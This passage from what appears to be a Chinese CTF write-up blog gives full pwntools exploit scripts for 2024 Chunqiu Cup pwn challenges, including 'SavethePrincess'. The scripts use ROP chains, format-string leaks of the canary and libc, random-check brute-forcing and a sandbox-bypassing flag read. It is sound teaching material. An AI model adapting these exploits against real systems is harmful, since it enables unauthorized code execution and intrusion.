LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>  <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span> ,<span class="hljs-string">&quot;split&quot;</span> ,<span class="hljs-string">&quot;-h&quot;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(file)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)  <br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;8.147.132.12&quot;</span>,<span class="hljs-number">17080</span>)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">2</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/</span><br><span class="hljs-string">        continue</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><span class="hljs-comment"># ret2dlresolve = Ret2dlresolvePayload(elf,&#x27;system&#x27;,[&#x27;/bin/sh&#x27;])</span><br><span class="hljs-comment"># rop = ROP(file)</span><br><span class="hljs-comment"># rop.read(0,ret2dlresolve.data_addr)</span><br><span class="hljs-comment"># rop.ret2dlresolve(ret2dlresolve)</span><br><span class="hljs-comment"># raw_rop = rop.chain()</span><br><br><span class="hljs-comment"># leave_ret = 0x0401285 </span><br><span class="hljs-comment"># ret = 0x040101a</span><br><span class="hljs-comment"># print(hex(len(raw_rop)))</span><br><br><span class="hljs-comment"># # dbg()</span><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># # sleep(0.5)</span><br><span class="hljs-comment"># s(b&#x27;a&#x27;*0x58 + p64(0x040125D))</span><br><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># # sleep(0.5)</span><br><span class="hljs-comment"># s(b&#x27;a&#x27;*0x28  + p64(ret) + raw_rop)</span><br><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># # sleep(0.5)</span><br><span class="hljs-comment"># pay =  ret2dlresolve.payload</span><br><span class="hljs-comment"># s(pay)</span><br><br>magic = <span class="hljs-number">0x04011fc</span><br><span class="hljs-comment">#add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br>rdi = <span class="hljs-number">0x004013d3</span><br>rsi = <span class="hljs-number">0x04013d1</span> <br><span class="hljs-comment">#pop rsi ; pop r15 ; ret</span><br>csu = <span class="hljs-number">0x04013CA</span><br><span class="hljs-comment">#pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span><br>csu2 = <span class="hljs-number">0x04013B0</span><br>rbp = <span class="hljs-number">0x004011fd</span><br>leave = <span class="hljs-number">0x0401285</span><br><br><span class="hljs-comment"># dbg()</span><br>pay =  p64(csu) + p64(<span class="hljs-number">0x10000000000000000</span>-(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]-libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])) + p64(<span class="hljs-number">0x0404070</span>+<span class="hljs-number">0x3d</span>) +p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(magic)<br>pay += p64(csu) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;setvbuf&#x27;</span>]) + p64(<span class="hljs-number">0x404040</span>+<span class="hljs-number">0x3d</span>) +p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(magic)<br>pay += p64(csu) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(elf.bss()+<span class="hljs-number">0x800</span>) + p64(<span class="hljs-number">0x100</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(csu2)<br>pay += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(rbp) + p64(elf.bss()+<span class="hljs-number">0x800</span>) + p64(leave)<br><br><span class="hljs-comment"># </span><br>s(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x040125D</span>))<br><br>pause()<br><br>s(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + pay)<br><br>pause()<br><br>pay2 = p64(rdi+<span class="hljs-number">1</span>) + p64(csu) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0x4048c0</span>) + p64(elf.bss()+<span class="hljs-number">0x800</span>) + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0x0404070</span>) + p64(csu2) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>sl(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + pay2)<br><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="SavethePrincess"><a href="#SavethePrincess" class="headerlink" title="SavethePrincess"></a>SavethePrincess</h2><p>​这道题目是我出的，同时看见其他师傅的wp后也是发现原来还有pread等读取文件的办法</p><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/3.png" class=""><p>格式化字符串加栈溢出，但是首先要绕过随机数的检查，这里可以发现由于buf和i是紧挨的，并且是单字节比较，可以通过将buf输满来泄露i，通过i的值来爆破随机数，开了沙箱，可以用mmap来读flag，就是找gadget很麻烦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>  <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span> ,<span class="hljs-string">&quot;split&quot;</span> ,<span class="hljs-string">&quot;-h&quot;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./SavethePrincess&#x27;</span><br>elf = ELF(file)<br><span class="hljs-comment">#libc = ELF(&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;)  </span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;8.147.128.163&quot;</span>,<span class="hljs-number">45329</span>)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">2</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/</span><br><span class="hljs-string">        continue</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">pd</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sa(<span class="hljs-string">b&#x27;:&#x27;</span>,pd)<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x15f2)&#x27;)</span><br>flag = <span class="hljs-string">b&quot;&quot;</span><br>key = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    key = flag<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(flag))<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>)+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">7</span>:<br>            key = flag + p8(k)<br>            key = key.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>            magic(key)<br>            <span class="hljs-built_in">print</span>(rl())<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;successfully&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> rl():<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                flag += <span class="hljs-built_in">chr</span>(k).encode()<br>                <span class="hljs-keyword">break</span><br>        key = flag + p8(k)<br>        key = key.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>        magic(key)<br>        ru(<span class="hljs-string">b&#x27;is &#x27;</span>)<br>        x = ru(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(x)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(x) != <span class="hljs-number">10</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(x[-<span class="hljs-number">1</span>]) == i+<span class="hljs-number">1</span>):<br>            flag += <span class="hljs-built_in">chr</span>(k).encode()<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-comment"># pause()</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br><br>s(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>magic(flag)<br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x166a)&#x27;)</span><br>s(<span class="hljs-string">b&#x27;%15$p%9$p%11$p%10$p&#x27;</span>)<br><br>rl()<br>rl()<br>libc_base = <span class="hljs-built_in">int</span>(pw.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x29d90</span><br>canary = <span class="hljs-built_in">int</span>(pw.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>pie_base = <span class="hljs-built_in">int</span>(pw.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">121</span> - <span class="hljs-number">0x01745</span><br>stack = <span class="hljs-built_in">int</span>(pw.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>lss(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;canary&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;pie_base&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;stack&#x27;</span>)<br><br>rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>rsi = libc_base + <span class="hljs-number">0x2be51</span><br>rdx_rbx = libc_base + <span class="hljs-number">0x00904a9</span><br>rax = libc_base + <span class="hljs-number">0x45eb0</span><br>r13 = libc_base + <span class="hljs-number">0x0000000000041c4a</span><br>rcx = libc_base + <span class="hljs-number">0x000000000003d1ee</span> <br>xchg_r8_rax = libc_base + <span class="hljs-number">0x9998e</span><br>mov_r9 = libc_base + <span class="hljs-number">0xd39d7</span><br><span class="hljs-comment"># 0x00000000000d39d7 : push 0 ; mov r9, qword ptr [rsp + 0x10] ; call r13</span><br>r10 = pie_base + <span class="hljs-number">0x017D5</span><br>syscall = libc_base + <span class="hljs-number">0x11481a</span><br>xchg_rsi_rax =  <span class="hljs-number">0x00000000001b5b65</span> + libc_base<br><span class="hljs-comment"># 0x00000000001b5b65 : xchg rsi, rax ; jmp qword ptr [rdx - 0xd]</span><br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x16ed)&#x27;)</span><br>payload = p64(rdi)+p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span> - <span class="hljs-number">99</span>)+p64(rsi)+p64(pie_base+<span class="hljs-number">0x4010</span>)+p64(libc_base+libc.sym[<span class="hljs-string">&#x27;openat&#x27;</span>])<br>payload += p64(r10)+p64(<span class="hljs-number">2</span>)+p64(rcx)+p64(<span class="hljs-number">2</span>)+p64(r13)+p64(syscall)+p64(rdx_rbx)+p64(<span class="hljs-number">7</span>)+p64(<span class="hljs-number">0</span>)+p64(rdi)+p64(<span class="hljs-number">0</span>)+p64(rsi)+p64(<span class="hljs-number">0x50</span>)+p64(rax)+p64(<span class="hljs-number">3</span>)+p64(xchg_r8_rax)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(rax)+p64(<span class="hljs-number">9</span>)+p64(mov_r9+<span class="hljs-number">2</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(rdx_rbx)+p64(stack+<span class="hljs-number">0x100</span>+<span class="hljs-number">0xd</span>)*<span class="hljs-number">2</span>+p64(xchg_rsi_rax)+p64(rdi)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">1</span>)+p64(rdx_rbx)+p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>+p64(libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;len :&quot;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>sl(<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + payload)<br><br><span class="hljs-comment"># dbg()</span><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution</h2><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/4.png" class=""><p></p><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/5.png" class=""><p>​syscall直接执行，但是shuffle会对输入的shellcode进行加密，但可以看到加密的长度是由strlen决定的，所以这里直接\x00截断就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> 